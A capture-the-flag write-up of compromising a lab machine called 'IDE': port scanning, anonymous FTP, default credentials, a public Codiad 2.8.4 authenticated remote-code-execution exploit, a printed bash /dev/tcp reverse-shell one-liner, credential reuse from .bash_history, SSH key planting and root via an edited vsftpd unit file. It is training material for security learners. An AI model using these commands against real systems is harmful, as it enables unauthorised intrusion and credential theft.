# IDE Writeup

## Enumeration

```sh
[whackx@manbox ~]$ nmap -sC -sV 10.10.251.137
Starting Nmap 7.92 ( https://nmap.org ) at 2021-10-17 20:27 CEST
Nmap scan report for 10.10.251.137
Host is up (0.066s latency).
Not shown: 997 closed tcp ports (conn-refused)
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.3
|_ftp-anon: Anonymous FTP login allowed (FTP code 230)
| ftp-syst:
|   STAT:
| FTP server status:
|      Connected to ::ffff:10.9.47.11
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 1
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   2048 e2:be:d3:3c:e8:76:81:ef:47:7e:d0:43:d4:28:14:28 (RSA)
|   256 a8:82:e9:61:e4:bb:61:af:9f:3a:19:3b:64:bc:de:87 (ECDSA)
|_  256 24:46:75:a7:63:39:b6:3c:e9:f1:fc:a4:13:51:63:20 (ED25519)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: Apache2 Ubuntu Default Page: It works
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

```
* Digging a bit deeper as well via
```sh
sudo nmap -sC -sV -vv --script vuln -oA nmap-full --defeat-rst-ratelimit 10.10.251.137
```

* Connecting to ftp is successful but there is seems to be no content on the first glance. One the second, there is difference in files size. Changing directory works, there is file called `-`.
```sh
[whackx@manbox ~]$ ftp 10.10.251.137
Connected to 10.10.251.137.
220 (vsFTPd 3.0.3)
Name (10.10.251.137:whackx): anonymous
331 Please specify the password.
Password:
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> ls
200 PORT command successful. Consider using PASV.
150 Here comes the directory listing.
226 Directory send OK.
ftp> ls -la
200 PORT command successful. Consider using PASV.
150 Here comes the directory listing.
drwxr-xr-x    3 0        114          4096 Jun 18 06:10 .
drwxr-xr-x    3 0        114          4096 Jun 18 06:10 ..
drwxr-xr-x    2 0        0            4096 Jun 18 06:11 ...
226 Directory send OK.
ftp> cd ...
250 Directory successfully changed.
ftp> ls
200 PORT command successful. Consider using PASV.
150 Here comes the directory listing.
-rw-r--r--    1 0        0             151 Jun 18 06:11 -
226 Directory send OK.
ftp> get -
200 PORT command successful. Consider using PASV.
150 Opening BINARY mode data connection for - (151 bytes).
Hey john,
I have reset the password as you have asked. Please use the default password to login.
Also, please take care of the image file ;)
- drac.

226 Transfer complete.
151 bytes received in 0,00378 seconds (39 kbytes/s)
```
* There is a user name `john` using the default password and a hint to an image file. The other user seems to be `drac` Thefirst username could be a hint to use john the ripper in some way, but it is only speculation so far. 

* There is nothing to of interest to find. Back to nmap and wider port ranges.
```sh
[whackx@manbox rem]$ nmap -p- 10.10.251.137
Starting Nmap 7.92 ( https://nmap.org ) at 2021-10-17 23:44 CEST
Stats: 0:02:38 elapsed; 0 hosts completed (1 up), 1 undergoing Connect Scan
Connect Scan Timing: About 84.86% done; ETC: 23:47 (0:00:28 remaining)
Nmap scan report for 10.10.251.137
Host is up (0.047s latency).
Not shown: 65531 closed tcp ports (conn-refused)
PORT      STATE SERVICE
21/tcp    open  ftp
22/tcp    open  ssh
80/tcp    open  http
62337/tcp open  unknown
```

* Enumerating the new service
```sh
[whackx@manbox rem]$ nmap -sC -sV -vv -p62337 10.10.251.137
Starting Nmap 7.92 ( https://nmap.org ) at 2021-10-17 23:48 CEST
NSE: Loaded 155 scripts for scanning.
[...]
Scanned at 2021-10-17 23:48:43 CEST for 13s

PORT      STATE SERVICE REASON  VERSION
62337/tcp open  http    syn-ack Apache httpd 2.4.29 ((Ubuntu))
|_http-title: Codiad 2.8.4
|_http-favicon: Unknown favicon MD5: B4A327D2242C42CF2EE89C623279665F
| http-methods:
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: Apache/2.4.29 (Ubuntu)
[...]
```

* Never heard of Codiad, lets have a quick search. Looks promising, three different rce scripts, all of them need authentication. 
```sh
[whackx@manbox rem]$ searchsploit codiad
--------------------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                               |  Path
--------------------------------------------------------------------------------------------- ---------------------------------
Codiad 2.4.3 - Multiple Vulnerabilities                                                      | php/webapps/35585.txt
Codiad 2.5.3 - Local File Inclusion                                                          | php/webapps/36371.txt
Codiad 2.8.4 - Remote Code Execution (Authenticated)                                         | multiple/webapps/49705.py
Codiad 2.8.4 - Remote Code Execution (Authenticated) (2)                                     | multiple/webapps/49902.py
Codiad 2.8.4 - Remote Code Execution (Authenticated) (3)                                     | multiple/webapps/49907.py
--------------------------------------------------------------------------------------------- ---------------------------------
```
* I log in with the user `john` and `password`. There is an IDE web application. Before I use any rce, I'll have look around.

* Someone coded a client and server for video streaming in Python. 
![Alt text](../include/ide/ide_after_login.png?raw=true "after login")

* `searchsploit -m multiple/webapps/49705.py`
```sh
        WangYihang <wangyihanger@gmail.com>
[whackx@manbox ide]$ python 49705.py http://10.10.124.33:62337/ john <password> 10.9.47.11 4448 linux
[+] Please execute the following command on your vps:
echo 'bash -c "bash -i >/dev/tcp/10.9.47.11/4449 0>&1 2>&1"' | nc -lnvp 4448
nc -lnvp 4449
[+] Please confirm that you have done the two command above [y/n]
[Y/n] y
[+] Starting...
[+] Login Content : {"status":"success","data":{"username":"john"}}
[+] Login success!
[+] Getting writeable path...
[+] Path Content : {"status":"success","data":{"name":"CloudCall","path":"\/var\/www\/html\/codiad_projects"}}
[+] Writeable Path : /var/www/html/codiad_projects
[+] Sending payload...
``` 

* Here comes the shell, connected as `www-data`
![Alt text](../include/ide/reverse_shell.png?raw=true "connecting")

* Enumerating the machine
```sh
www-data@ide:/var/www/html/codiad/components/filemanager$ id
id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
www-data@ide:/var/www/html/codiad/components/filemanager$ cat /etc/passwd
cat /etc/passwd
root:x:0:0:root:/root:/bin/bash
[...]
drac:x:1000:1000:drac:/home/drac:/bin/bash
ftp:x:111:114:ftp daemon,,,:/srv/ftp:/usr/sbin/nologin
www-data@ide:/var/www/html/codiad/components/filemanager$ sudo --version
sudo --version
Sudo version 1.8.21p2
Sudoers policy plugin version 1.8.21p2
Sudoers file grammar version 46
Sudoers I/O plugin version 1.8.21p2
www-data@ide:/var/www/html/codiad/components/filemanager$ uname -a
uname -a
Linux ide 4.15.0-147-generic #151-Ubuntu SMP Fri Jun 18 19:21:19 UTC 2021 x86_64 x86_64 x86_64 GNU/Linux
www-data@ide:/var/www/html/codiad/components/filemanager$ find / -perm /6000 2>/dev/null
<ponents/filemanager$ find / -perm /6000 2>/dev/null
/sbin/unix_chkpwd
/sbin/pam_extrausers_chkpwd
/usr/local/share/fonts
/usr/local/share/emacs
/usr/local/share/emacs/site-lisp
/usr/local/lib/python3.6
/usr/local/lib/python3.6/dist-packages
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/lib/openssh/ssh-keysign
/usr/lib/eject/dmcrypt-get-device
/usr/lib/x86_64-linux-gnu/lxc/lxc-user-nic
/usr/lib/x86_64-linux-gnu/utempter/utempter
/usr/lib/snapd/snap-confine
/usr/lib/policykit-1/polkit-agent-helper-1
/usr/bin/passwd
/usr/bin/chfn
/usr/bin/newgrp
/usr/bin/at
/usr/bin/newgidmap
/usr/bin/chage
/usr/bin/pkexec
/usr/bin/sudo
/usr/bin/mlocate
/usr/bin/ssh-agent
/usr/bin/expiry
/usr/bin/crontab
/usr/bin/traceroute6.iputils
/usr/bin/wall
/usr/bin/newuidmap
/usr/bin/bsd-write
/usr/bin/chsh
/usr/bin/gpasswd
/bin/umount
/bin/fusermount
/bin/ping
/bin/mount
/bin/su
/var/log/journal
/var/log/journal/a501de65b06e4fd69f6cb644dc11fcf5
/var/mail
/var/local
www-data@ide:/var/www/html/codiad/components/filemanager$ cat /etc/crontab
cat /etc/crontab
# /etc/crontab: system-wide crontab
# Unlike any other crontab you don't have to run the `crontab'
# command to install the new version when you edit this file
# and files in /etc/cron.d. These files also have username fields,
# that none of the other crontabs do.

SHELL=/bin/sh
PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin

# m h dom mon dow user  command
17 *    * * *   root    cd / && run-parts --report /etc/cron.hourly
25 6    * * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.daily )
47 6    * * 7   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.weekly )
52 6    1 * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.monthly )
#
```

* Checking `.bash_history` of user drac yields database credentials. There is no database client on the server, but password reuse is real. 
```sh
us drac
ta@ide:/var/www/html/codiad/data$ su drac
su drac
Password: <XXXXXXXXXXX>
```

* First thing to look for is `sudo -l`
```sh
drac@ide:~$ sudo -l
sudo -l
[sudo] password for drac: 02930d21a8eb009f6d26361b2d24a466

Sorry, try again.
[sudo] password for drac: <password>

Matching Defaults entries for drac on ide:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User drac may run the following commands on ide:
    (ALL : ALL) /usr/sbin/service vsftpd restart
```
* This means control over a service and its unit script. Lets change the content to a reverse shell and restart the service. The shell is too unstable to edit files, lets do a shell upgrade via ssh.
```sh
drac@ide:~$ mkdir .ssh
mkdir .ssh
drac@ide:~$ chmod 700 .ssh
chmod 700 .ssh
drac@ide:~$ cd .ssh
cd .ssh
drac@ide:~$ echo <ssh-public-key> > auhtorized_keys
drac@ide:~$ chmod 600 authorized_keys
```
```sh
[whackx@manbox ~]$ ssh drac@10.10.124.33 -i drackey
```

* Now I'll edit the unit script.
![Alt text](../include/ide/unit_script.png?raw=true "unit script")

```sh
drac@ide:~$ systemctl daemon-reload
drac@ide:~$ sudo /usr/sbin/service vsftpd restart
```

* An there is the root shell
![Alt text](../include/ide/root_shell.png?raw=true "root shell")




